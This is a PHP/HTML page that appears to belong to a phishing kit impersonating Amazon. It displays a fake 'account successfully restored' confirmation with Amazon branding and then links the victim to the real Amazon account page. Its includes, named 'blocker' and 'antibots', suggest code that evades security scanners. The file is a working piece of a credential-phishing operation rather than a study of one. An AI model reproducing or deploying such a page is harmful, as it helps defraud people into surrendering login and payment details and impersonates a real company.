<?php 
  include './lib/loca.php';
  include './lib/browser.php';
  include './lib/system.php';
  include './lib/blocker.php';
  include './lib/antibots4.php';
?>

<html>
<head>
<title>Amazon - Thank you </title>
<link rel='icon' href='./img/icon.png'>
<link rel='stylesheet' href='./css/style.css'>
<script src='./js/q.js'></script>
<script src='./js/m.js'></script>
<meta charset='utf-8'>
<meta name='viewport' content='width=device-width' />
</head>
<body>
<center>
<header>
<div class='hleft'>
<img  src='./img/a.svg' class='img'></img>
<div style='float:right;'>
<a href='#'><button class='logout'>Log out</button></a>
</div>
</div>
</header>
<br><br>
<img class='img2' src='./img/logo.png'></img>
<br><br>
<div class='boxlogin'>
<div style='font-size:0.8em;'>
<div style='background:#b3ffb3; padding:10px; border:1px solid green; border-radius:6px; '>
<h2>Congratulations !</h2>
<b>you have successfully restored your account , thank you ! </b>
</div><br>
<style>
a:hover{text-decoration:none;}
</style>
<a href='https://www.amazon.com/your-account'><input type='button' class=' button'name='get' value='My account' ></a>
 </div>
 
 
</div>
 


 <br><br>
<div style='font-size:0.6em;'>
<a href="#" style='margin-right:16px;'> Conditions of Use </a>
<a href='#' style='margin-right:16px;'>Privacy Notice </a>
<a href='#' style='margin-right:16px;'>Help </a>
<br><br>
© 1996-2018, Amazon.com, Inc. or its affiliates 
</div>
</center>
</body>
</html>